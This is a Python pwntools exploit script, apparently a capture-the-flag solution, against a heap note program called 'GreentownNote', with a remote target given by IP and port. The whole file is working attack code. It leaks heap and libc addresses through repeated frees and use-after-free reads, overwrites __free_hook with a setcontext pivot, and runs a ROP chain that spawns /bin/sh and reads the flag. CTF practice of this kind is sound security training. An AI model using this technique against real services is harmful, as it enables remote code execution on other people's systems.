#!/usr/bin/env python
from pwn import *

#context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

local = 1
if local:
    p = process('./GreentownNote')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    p = remote('82.157.5.28', 51601)
    libc = ELF('./libc.so.6')

def choice(c):
    p.recvuntil('> Your choice :')
    p.sendline(str(c))

def add(sz, data):
    choice(1)
    p.recvuntil('> Note size :')
    p.sendline(str(sz))
    p.recvuntil('> Content :')
    p.send(data)

def show(idx):
    choice(2)
    p.recvuntil('| Index :')
    p.sendline(str(idx))

def delete(idx):
    choice(3)
    p.recvuntil('| Index :')
    p.sendline(str(idx))

# leak libc
add(0x400, '0') # 0
add(0x400, '1') # 1
add(0x100, '2') # 2
for i in range(7):
    delete(0)
show(0)
p.recvuntil('| Content: ')
heap_base = u64(p.recv(6).ljust(8, '\x00')) - 0x260
info('heap_base = ' + hex(heap_base))
delete(1)
show(1)
p.recvuntil('| Content: ')
malloc_hook = u64(p.recv(6).ljust(8, '\x00')) - 0x70
info('malloc_hook = ' + hex(malloc_hook))
libc_base = malloc_hook - libc.symbols['__malloc_hook']
info('libc_base = ' + hex(libc_base))

# gadgets
pop_rax_ret = libc_base + 0x00000000000439c8
pop_rsi_ret = libc_base + 0x0000000000023e6a
pop_rdx_ret = libc_base + 0x0000000000001b96
pop_r10_ret = libc_base + 0x00000000001306b5
pop_r8_before_rax_ret = libc_base + 0x0000000000155fc6
syscall = libc_base + 0x00000000000013c0

# write __free_hook
free_hook = libc_base + libc.symbols['__free_hook']
setcontext = libc_base + libc.symbols['setcontext']
bin_sh_addr = libc_base + next(libc.search('/bin/sh\x00'))
add(0x400, p64(free_hook)) # 3
payload = (
    p64(bin_sh_addr) + 
    p64(pop_rdx_ret) + p64(0) + 
    p64(pop_r10_ret) + p64(0) + 
    p64(pop_r8_before_rax_ret) + p64(0) + 
    p64(pop_rax_ret) + p64(322) + 
    p64(syscall)
).ljust(0xa0, '\x00')
payload = payload + p64(heap_base + 0x260) + p64(pop_rsi_ret)
add(0x400, payload) # 4
add(0x400, p64(setcontext + 0x35))
delete(0)
p.sendline('exec 3<flag; read flag <&3; echo $flag')

#gdb.attach(p)

p.interactive()

